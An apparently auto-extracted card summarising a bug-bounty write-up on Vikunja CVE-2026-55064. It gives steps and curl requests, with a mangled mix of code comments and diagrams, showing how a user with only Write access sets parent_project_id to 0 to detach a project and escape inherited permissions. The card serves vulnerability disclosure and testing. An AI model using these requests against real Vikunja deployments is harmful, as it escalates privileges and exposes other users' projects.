---
id: 5eddcc937be1
title: "Vikunja CVE-2026-55064: The Vulnerability Hidden in the Previous Security Fix"
source_url: https://medium.com/@Infosec-Arsenal-Diaries/vikunja-cve-2026-55064-the-vulnerability-hidden-in-the-previous-security-fix-3f84f84c35bc
author: "Antariksha Akhilesh Sharma"
publication_date: 2026-08-12
category: privilege-escalation
category_label: "Privilege Escalation"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "bug-bounty"
  - "cybersecurity"
  - "golang"
  - "application-security"
  - "vulnerability"
tools:
  - "curl"
quick_test: "Test if a user with Write access can detach a project from its parent by setting parent_project_id to 0 and verify if the operation succeeds without Admin privileges."
---

## Use case

The vulnerability allowed a user with Write access to detach a project from its parent, effectively granting them Admin-like capabilities over the project's permissions. This could lead to unauthorized access for collaborators relying on inherited permissions.

## Steps to test

1. Confirm the account lacks Admin privileges by attempting to delete a project and observing a 403 Forbidden response.
2. Perform a POST request to update the project with parent_project_id set to 0, which should succeed despite lacking Admin rights.

## Commands

```text
curl -s -o /dev/null -w '%{http_code}' -X DELETE http://localhost:3456/api/v1/projects/4 -H 'Authorization: Bearer $TOKEN'
curl -s -X POST http://localhost:3456/api/v1/projects/4 -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' -d '{"title":"Sensitive Child Project","parent_project_id":0}'
// Only gate on non-zero ParentProjectID: the generic update handler
// binds a fresh struct, so an omitted parent_project_id is
// indistinguishable from an explicit 0. Detach-to-root is therefore
// out of scope here -- a proper fix needs a pointer field.
{
"parent_project_id": 0
}
ParentProjectID == 0
Project A
|
+--> move beneath Project B
Project A
|
X
detach to root
curl -s -o /dev/null -w '%{http_code}' -X DELETE \
http://localhost:3456/api/v1/projects/4 \
-H "Authorization: Bearer $TOKEN"
# 403
curl -s -X POST http://localhost:3456/api/v1/projects/4 \
-H "Authorization: Bearer $TOKEN" \
-H 'Content-Type: application/json' \
-d '{"title":"Sensitive Child Project","parent_project_id":0}'
old parent -> new parent
```

## Source

- Author: Antariksha Akhilesh Sharma
- Writeup: https://medium.com/@Infosec-Arsenal-Diaries/vikunja-cve-2026-55064-the-vulnerability-hidden-in-the-previous-security-fix-3f84f84c35bc

_For authorized testing only. Credit the original author._
